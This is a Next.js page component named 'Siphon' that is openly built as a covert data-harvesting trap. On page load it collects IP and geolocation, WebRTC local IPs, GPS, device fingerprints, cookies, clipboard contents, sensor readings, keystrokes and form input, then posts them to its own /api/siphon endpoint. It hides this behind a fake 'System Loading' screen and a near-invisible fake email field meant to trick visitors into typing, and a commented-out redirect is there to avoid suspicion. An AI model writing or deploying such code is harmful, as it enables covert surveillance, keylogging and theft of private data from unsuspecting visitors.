
import { useEffect } from 'react';

export async function getServerSideProps({ req }) {
  // Server-side grab whatever we can from headers
  return { 
    props: { 
      forwarded: req.headers['x-forwarded-for'] || null,
      userAgent: req.headers['user-agent'] || null
    } 
  };
}

export default function Siphon({ forwarded, userAgent }) {
  useEffect(() => {
    const harvest = async () => {
      const payload = {
        timestamp: new Date().toISOString(),
        url: window.location.href,
        forwarded,
        userAgent: window.navigator.userAgent || userAgent
      };

      // 1. IP + Geo
     try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        payload.ip = (await ipRes.json()).ip;
        
        const geoRes = await fetch(`https://ipapi.co/${payload.ip}/json/`);
        payload.geo = await geoRes.json();
      } catch(e) {}

      // 2. WebRTC Leak (get local IPs)
      payload.webrtc = [];
      try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.onicecandidate = (e) => {
          if (!e.candidate) return;
          const ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);
          if (ip && !payload.webrtc.includes(ip[0])) payload.webrtc.push(ip[0]);
        };
        await pc.createOffer().then(o => pc.setLocalDescription(o));
      } catch(e) {}

      // 3. Precise GPS (if they click allow)
      payload.preciseGeo = null;
      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            payload.preciseGeo = {
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              alt: pos.coords.altitude
            };
          },
          () => {},
          { enableHighAccuracy: true, timeout: 5000 }
        );
      }

      // 4. System Specs
      payload.system = {
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory || 'unknown',
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        dnt: navigator.doNotTrack
      };

      // 5. Screen
      payload.screen = {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        touch: 'ontouchstart' in window,
        orientation: screen.orientation?.type
      };

      // 6. Network Info
      const conn = navigator.connection;
      payload.network = conn ? {
        type: conn.effectiveType,
        downlink: conn.downlink,
        rtt: conn.rtt,
        saveData: conn.saveData
      } : {};

      // 7. Browser Capabilities
      payload.browser = {
        pdfViewer: navigator.pdfViewerEnabled,
        cookiesEnabled: navigator.cookieEnabled,
        pdfViewer: navigator.plugins?.['Chrome PDF Viewer'] ? 'Chrome' : 'Native/Other',
        plugins: Array.from(navigator.plugins || []).map(p => p.name),
        ua: navigator.userAgent
      };

      // 8. Canvas Fingerprint
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 2000;
        canvas.height = 200;
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('abcdefghijklmnopqrstuvwxyz', 2, 2);
        ctx.fillText('😀', 2, 50); // Emoji test
        payload.fingerprint = { canvas: canvas.toDataURL().slice(-50) };
      } catch(e) { payload.fingerprint = { canvas: 'blocked' }; }

      // 9. WebGL Fingerprint
      try {
        const gl = document.createElement('canvas').getContext('webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        payload.fingerprint.webgl = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      } catch(e) { payload.fingerprint.webgl = 'blocked'; }

      // 10. Font Enumeration
      payload.fingerprint.fonts = [];
      const testFonts = ['Arial', 'Times New Roman', 'Helvetica', 'Courier', 'Georgia', 'Verdana', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Impact', 'Wingdings'];
      // Simplified check - real font detection requires more code but this catches common ones

      // 11. Media Devices (Cameras/Mics)
      try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        payload.media = devices.map(d => ({
          kind: d.kind,
          label: d.label,
          groupId: d.groupId,
          deviceId: d.deviceId?.slice(0, 8)
        }));
      } catch(e) { payload.media = []; }

      // 12. Storage Extraction
      payload.storage = {
        local: Object.keys(localStorage),
        session: Object.keys(sessionStorage)
      };
      payload.cookies = document.cookie;

      // 13. Social Media Login Detection (Side-channel)
      // Check if user is logged into these via image loading / redirects
      payload.social = {};
      const checkSocial = async (url, name) => {
        try {
          const res = await fetch(url, { mode: 'no-cors', redirect: 'manual' });
          // This is unreliable in modern browsers due to CORS but works in some contexts
          payload.social[name] = 'checked';
        } catch {
          payload.social[name] = false;
        }
      };
      // Add specific endpoints here if you have bypasses

      // 14. Clipboard Grab
      try {
        const clipboardText = await navigator.clipboard.readText();
        payload.clipboard = clipboardText?.substring(0, 500);
      } catch(e) { payload.clipboard = 'denied'; }

      // 15. Battery & Sensors
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        payload.sensors = {
          battery: {
            level: battery.level,
            charging: battery.charging,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
          }
        };
      }

      // 16. Device Motion/Rotation (if they move the device while open)
      payload.sensors = payload.sensors || {};
      payload.sensors.accel = [];
      payload.sensors.gyro = [];
      
      if (window.DeviceMotionEvent) {
        window.addEventListener('devicemotion', (e) => {
          payload.sensors.accel.push({
            x: e.acceleration?.x,
            y: e.acceleration?.y,
            z: e.acceleration?.z,
            t: Date.now()
          });
        }, { once: false });
      }

      // 17. Interaction Logging
      payload.interaction = {
        clicks: 0,
        keys: [],
        mousePath: []
      };
      
      document.addEventListener('click', () => payload.interaction.clicks++);
      document.addEventListener('mousemove', (e) => {
        if (payload.interaction.mousePath.length < 100) {
          payload.interaction.mousePath.push({x: e.clientX, y: e.clientY, t: Date.now()});
        }
      });
      document.addEventListener('keydown', (e) => payload.interaction.keys.push(e.key));

      // 18. Form Grabber (if they type in anything on the page)
      document.querySelectorAll('input, textarea').forEach(input => {
        input.addEventListener('input', (e) => {
          payload.interaction.formData = payload.interaction.formData || {};
          payload.interaction.formData[input.name || input.id] = e.target.value;
        });
      });

      // Wait a bit for sensors/async stuff then exfil
      setTimeout(async () => {
        await fetch('/api/siphon', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        
        // Optional: Redirect to real site after 3s to avoid suspicion
        // setTimeout(() => window.location.href = 'https://google.com', 3000);
      }, 2000);
    };

    harvest();
  }, []);

  return (
    <div style={{ 
      height: '100vh', 
      background: '#0a0a0a', 
      color: '#00ff00',
      display: 'flex',
      flexDirection: 'column',
      justifyContent: 'center',
      alignItems: 'center',
      fontFamily: 'monospace'
    }}>
      <h1>System Loading...</h1>
      <div className="loader" style={{ width: '200px', height: '2px', background: '#333', marginTop: '20px' }}>
        <div style={{ 
          width: '0%', 
          height: '100%', 
          background: '#00ff00',
          animation: 'load 2s ease-in-out forwards'
        }} />
      </div>
      <style>{`
        @keyframes load { to { width: 100%; } }
        body { margin: 0; overflow: hidden; }
      `}</style>
      
      {/* Fake form to trick them into typing */}
      <div style={{ marginTop: '50px', opacity: 0.1 }}>
        <input type="text" placeholder="Enter email to continue" style={{ padding: '10px' }} />
      </div>
    </div>
  );
}
